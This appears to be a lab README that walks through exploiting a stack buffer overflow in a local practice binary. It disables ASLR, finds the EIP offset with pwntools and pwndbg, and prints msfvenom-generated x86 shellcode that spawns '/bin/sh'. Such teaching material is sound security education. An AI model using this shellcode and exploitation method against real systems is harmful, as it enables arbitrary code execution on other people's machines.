# BOF Example

## Requirements

- pwntools
- pwndbg

Disable ASLR

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

> Don't forget to reenable the feature
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

## X64?

You will need 32-bit development headers and libraries

```bash
sudo apt-get install gcc-multilib
```

## Get the offset

1. Run pwndbg and use pwntools cyclic function to get the register info

```bash
gdb ./vuln
run $(python3 -c 'from pwn import *; print(cyclic(500))')
x/300x $esp
info registers
```

2. Capture the %eip value after crash

```txt
0x61646361
```

3. Get the offset related to the value

```bash
pwndbg> cyclic -l 0x61646361
Finding cyclic pattern of 4 bytes: b'acda' (hex: 0x61636461)
Found at offset 210
```

4. Check the offset works as expected with a custom payload

```bash
run $(python3 -c 'from pwn import *; import sys; print("A"*210 + "B"*4)')
```

As we can see, there is some issue with the aligment, we need to add 2 bytes to control the EIP effectively 

```bash
break vuln
run $(python3 -c 'from pwn import *; import sys; print("A"*212 + "B"*4)')
n
info registers
x/300x $esp
c
info registers
```
## Generate the shellcode!

```
msfvenom -p linux/x86/exec CMD='/bin/sh' -b "\x00\x0a\x0d\x20" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of python file: 357 bytes
buf =  b""
buf += b"\xba\x13\xc0\x5c\xd1\xdb\xca\xd9\x74\x24\xf4\x5e"
buf += b"\x33\xc9\xb1\x0b\x31\x56\x15\x03\x56\x15\x83\xee"
buf += b"\xfc\xe2\xe6\xaa\x57\x89\x91\x79\x0e\x41\x8c\x1e"
buf += b"\x47\x76\xa6\xcf\x24\x11\x36\x78\xe4\x83\x5f\x16"
buf += b"\x73\xa0\xcd\x0e\x8b\x27\xf1\xce\xa3\x45\x98\xa0"
buf += b"\x94\xfa\x32\x3d\xbc\xaf\x4b\xdc\x8f\xd0"
```
NULL -> \x00
NewLine -> \x0a
Carriage Return ->\x0d
Space -> \x20

shellcode -> 70 bytes :)

## Run the exploit
./vuln $(python3 solution_exploit.py)




## Now let's build the exploit

Check the [solution file](./solution_exploit.py))
